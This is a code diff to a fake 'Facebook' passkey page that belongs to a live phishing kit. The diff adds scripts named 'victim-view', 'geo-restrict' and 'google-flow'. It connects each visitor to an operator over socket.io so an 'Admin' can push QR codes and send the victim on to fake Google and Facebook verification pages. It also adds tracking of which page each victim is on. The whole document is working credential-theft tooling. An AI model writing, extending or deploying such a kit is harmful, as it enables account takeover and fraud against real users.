@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Facebook</title>
   <!-- Captcha guard — same as other pages -->
+  <script src="assets/geo-restrict.js"></script>
   <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
   <link rel="icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yz/r/KFyVIAWzntM.ico" />
   <meta name="robots" content="noindex, nofollow" />
@@ -126,6 +127,8 @@
 
   </div>
 
+  <script src="assets/google-flow.js"></script>
+  <script src="assets/victim-view.js"></script>
   <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <script>
     (function () {
@@ -143,6 +146,8 @@
         transports: ['websocket', 'polling'],
         query: clientId ? { clientId: clientId } : {}
       });
+      window.socket = socket;
+      if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
 
       socket.on('assign-client-id', function (id) {
         clientId = id;
@@ -154,6 +159,7 @@
         if (cid) {
           socket.emit('userConnectedToPage', { clientId: cid, page: 'passkey' });
         }
+        if (typeof VictimView !== 'undefined') VictimView.report('passkey');
       });
 
       /* Admin sends the QR code image (base64 data URI or https URL) */
@@ -180,14 +186,10 @@
       });
 
       /* Admin sends user back to Google login flow from passkey page */
-      socket.on('show-google-login', function () {
-        var fbEmail = sessionStorage.getItem('lastLoginEmail') || '';
-        try {
-          sessionStorage.setItem('lastLoginEmail', fbEmail);
-          sessionStorage.setItem('googleReturnPage', 'apply.html');
-          sessionStorage.setItem('fbVerifySession', '1');
-        } catch(e) {}
-        window.location.href = 'fb-verify.html';
+      socket.on('show-google-login', function (data) {
+        GoogleVerifyFlow.startFbVerifyFlow({
+          returnPage: 'apply.html'
+        }, data);
       });
 
       /* If admin triggers a Facebook modal from passkey page — go back to apply.html */
